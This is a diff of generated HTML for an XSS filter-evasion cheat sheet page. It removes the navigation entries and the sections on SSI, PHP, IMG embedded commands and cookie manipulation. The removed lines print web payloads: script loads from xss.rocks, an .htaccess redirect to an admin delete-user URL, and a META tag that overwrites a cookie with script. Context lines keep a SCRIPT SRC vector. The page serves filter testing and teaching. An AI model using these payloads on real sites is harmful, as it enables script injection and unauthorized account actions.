@@ -5160,67 +5160,6 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#ssi-server-side-includes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        SSI (Server Side Includes)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#php" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        PHP
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#img-embedded-commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        IMG Embedded Commands
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="IMG Embedded Commands">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#img-embedded-commands-part-ii" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        IMG Embedded Commands part II
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#cookie-manipulation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Cookie Manipulation
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#xss-using-html-quote-encapsulation" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -6530,67 +6469,6 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#ssi-server-side-includes" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        SSI (Server Side Includes)
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#php" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        PHP
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#img-embedded-commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        IMG Embedded Commands
-      
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="IMG Embedded Commands">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#img-embedded-commands-part-ii" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        IMG Embedded Commands part II
-      
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#cookie-manipulation" class="md-nav__link">
-    <span class="md-ellipsis">
-      
-        Cookie Manipulation
-      
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
   <a href="#xss-using-html-quote-encapsulation" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -7360,28 +7238,6 @@ to hack Google Desktop. As a side note, you can remove the end <code>&lt;/STYLE&
 <h3 id="assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js">Assuming you can only fit in a few characters and it filters against <code>.js</code><a class="headerlink" href="#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js" title="Permanent link">&para;</a></h3>
 <p>This attack allows you to rename your JavaScript file to an image as an XSS vector:</p>
 <div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">SCRIPT</span> <span class="na">SRC</span><span class="o">=</span><span class="s">"http://xss.rocks/xss.jpg"</span><span class="p">&gt;&lt;/</span><span class="nt">SCRIPT</span><span class="p">&gt;</span>
-</code></pre></div>
-<h3 id="ssi-server-side-includes">SSI (Server Side Includes)<a class="headerlink" href="#ssi-server-side-includes" title="Permanent link">&para;</a></h3>
-<p>This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:</p>
-<div class="highlight"><pre><span></span><code><span class="c">&lt;!--</span><span class="n">#exec</span><span class="w"> </span><span class="nx">cmd</span><span class="o">=</span><span class="s2">"/bin/echo '&lt;SCR'"</span><span class="o">--&gt;</span><span class="c">&lt;!--</span><span class="n">#exec</span><span class="w"> </span><span class="nx">cmd</span><span class="o">=</span><span class="s2">"/bin/echo 'IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;'"</span><span class="o">--&gt;</span>
-</code></pre></div>
-<h3 id="php">PHP<a class="headerlink" href="#php" title="Permanent link">&para;</a></h3>
-<p>This attack requires PHP to be installed on the server. Again, if you can run any scripts remotely like this, there are probably much more dire issues:</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span> <span class="k">echo</span><span class="p">(</span><span class="s1">'&lt;SCR)'</span><span class="p">;</span>
-<span class="k">echo</span><span class="p">(</span><span class="s1">'IPT&gt;alert("XSS")&lt;/SCRIPT&gt;'</span><span class="p">);</span> <span class="cp">?&gt;</span>
-</code></pre></div>
-<h3 id="img-embedded-commands">IMG Embedded Commands<a class="headerlink" href="#img-embedded-commands" title="Permanent link">&para;</a></h3>
-<p>This attack only works when this is injected (like a web-board) in a web page behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc. This is one of the lesser used but more useful XSS vectors:</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">IMG</span> <span class="na">SRC</span><span class="o">=</span><span class="s">"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"</span><span class="p">&gt;</span>
-</code></pre></div>
-<h4 id="img-embedded-commands-part-ii">IMG Embedded Commands part II<a class="headerlink" href="#img-embedded-commands-part-ii" title="Permanent link">&para;</a></h4>
-<p>This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <code>&lt;IMG SRC="httx://badguy.com/a.jpg"&gt;</code> could actually be an attack vector to run commands as the user who views the image link. Here is the <code>.htaccess</code> (under Apache) line to accomplish the vector:</p>
-<div class="highlight"><pre><span></span><code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser
-</code></pre></div>
-<p>(Thanks to Timo for part of this)</p>
-<h3 id="cookie-manipulation">Cookie Manipulation<a class="headerlink" href="#cookie-manipulation" title="Permanent link">&para;</a></h3>
-<p>This method is pretty obscure but there are a few examples where <code>&lt;META</code> is allowed and it can be used to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc):</p>
-<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">META</span> <span class="na">HTTP-EQUIV</span><span class="o">=</span><span class="s">"Set-Cookie"</span> <span class="na">Content</span><span class="o">=</span><span class="s">"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"</span><span class="p">&gt;</span>
 </code></pre></div>
 <h3 id="xss-using-html-quote-encapsulation">XSS Using HTML Quote Encapsulation<a class="headerlink" href="#xss-using-html-quote-encapsulation" title="Permanent link">&para;</a></h3>
 <p>This attack was originally tested in IE so your mileage may vary. For performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>&lt;SCRIPT SRC...</code> by way of a regex filter <code>/\&lt;script\[^\&gt;\]+src/i</code>, do the following:</p>
